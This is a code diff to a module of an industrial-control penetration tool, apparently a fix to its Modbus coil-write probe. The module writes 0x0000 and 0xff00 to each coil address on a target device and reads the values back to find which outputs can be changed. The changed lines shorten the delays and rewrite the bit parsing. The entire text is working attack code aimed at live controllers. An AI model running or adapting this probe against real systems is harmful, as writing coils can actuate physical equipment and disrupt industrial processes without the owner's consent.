@@ -33,7 +33,6 @@ class Module:
     address = []
 
     def exploit(self):
-
         moduleName = self.info["Name"]
         print(
             bcolors.OKBLUE + "[+]" + bcolors.ENDC + " Module " + moduleName + " Start"
@@ -78,8 +77,8 @@ class Module:
             self.printLine("[-] Modbus is not running on : " + ip, bcolors.WARNING)
             return None
         self.printLine("[+] Connecting to " + ip, bcolors.OKGREEN)
-        print(f"Address {hex(i)} ".center(20, "#"))
         for i in range(0x0000, 0x0050, int(self.options["Quantity"][0], 16)):
+            print(f"Address {hex(i)} ".center(20, "#"))
             # 先写入0x0000
             ans = c.sr1(
                 ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
@@ -90,8 +89,7 @@ class Module:
                 timeout=timeout,
                 verbose=0,
             )
-            ans = ModbusADU_Answer(bytes(ans))
-            sleep(2)
+            sleep(0.2)
             # 再读取写入的值
             ans = c.sr1(
                 ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
@@ -103,10 +101,11 @@ class Module:
                 verbose=0,
             )
             ans = ModbusADU_Answer(bytes(ans))
-            print(f"read first:{ans}")
+            s = bytes(ans)[9:]
+            s = ''.join([bin(int(hex(i), 16))[2:].zfill(8)[::-1] for i in s])
+            print(f"read first:{s[0]}")
             ## 保存读到的线圈值
-            read_1 = bytes(ans)[-1]
-            sleep(2)
+            read_1 = 1 if s[0] == '0' else 0
             # 写入0xff00
             ans = c.sr1(
                 ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
@@ -117,8 +116,7 @@ class Module:
                 timeout=timeout,
                 verbose=0,
             )
-            ans = ModbusADU_Answer(bytes(ans))
-            sleep(2)
+            sleep(0.2)
             # 第二次读线圈值，与我们写入的值比较
             ans = c.sr1(
                 ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
@@ -130,10 +128,12 @@ class Module:
                 verbose=0,
             )
             ans = ModbusADU_Answer(bytes(ans))
-            print(f"read second:{ans}")
+            s = bytes(ans)[9:]
+            s = ''.join([bin(int(hex(i), 16))[2:].zfill(8)[::-1] for i in s])
+            print(f"read second:{s[0]}")
             ## 保存读到的线圈值
-            read_2 = bytes(ans)[-1]
-            if read_1 != read_2:
+            read_2 = 1 if s[0] == '1' else 0
+            if read_1 + read_2 == 2:
                 print(f"{hex(i)} address can be modifiable!")
                 self.address.append(hex(i))
         print(self.address)
